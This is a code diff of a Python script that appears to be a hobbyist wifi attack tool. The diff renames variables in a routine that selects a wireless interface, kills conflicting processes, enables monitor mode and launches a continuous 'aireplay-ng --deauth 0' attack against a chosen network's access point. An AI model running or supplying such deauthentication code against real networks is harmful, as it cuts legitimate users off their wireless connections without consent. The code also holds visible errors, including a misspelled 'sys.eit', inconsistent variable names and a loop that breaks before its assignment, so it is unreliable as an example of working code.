@@ -50,12 +50,10 @@ else:
 
 
 interface = re.compile("^wlan[0-9]+")  ################## FIGURE THIS OUT #######
-check_wifi_results = interface.findall(subprocess.run(['iwconfig'], capture_output = True).stdout.decode())
-
-
+wifi_results = interface.findall(subprocess.run(['iwconfig'], capture_output = True).stdout.decode())
 
 try:
-    if len(interface) != 0:
+    if len(wifi_results) != 0:
         pass
     else:
         print("[SYSTEM] Either change your wifi interface to, or see code.")
@@ -65,15 +63,15 @@ except Exception as e:
     sys.eit(1)
 else:
     print(f'[SYSTEM] The following interfaces are available:')
-    for index, item in enumerate(check_wifi_result):
+    for index, item in enumerate(wifi_results):
         print(f'({index}, {item}')
     while True:
         user_iw = input('[SYSTEM] Please enter  the interface you want to use')
         try:
-            if check_wifi_results[int(user_iw)]:
+            if wifi_results[int(user_iw)]:
                 break
 
-            nic = check_wifi_results[int(user_iw)]
+            nic = wifi_results[int(user_iw)]
             print('[SYSTEM] Wifi adapter now connected, killing conflicting processes.')
             kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
             print('[SYSTEM] Putting WIFI into monitor mode: ')
@@ -117,7 +115,7 @@ try:
                             hack_channel = active_wireless_networks[int(choice)]["channel"].strip()
                             subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
                             subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
-                                            check_wifi_result[int(wifi_interface_choice)] + "mon"])
+                            wifi_result[int(wifi_interface_choice)] + "mon"])
                     except:
                         print("[SYSTEM] Please Try Again.")
             time.sleep(1)
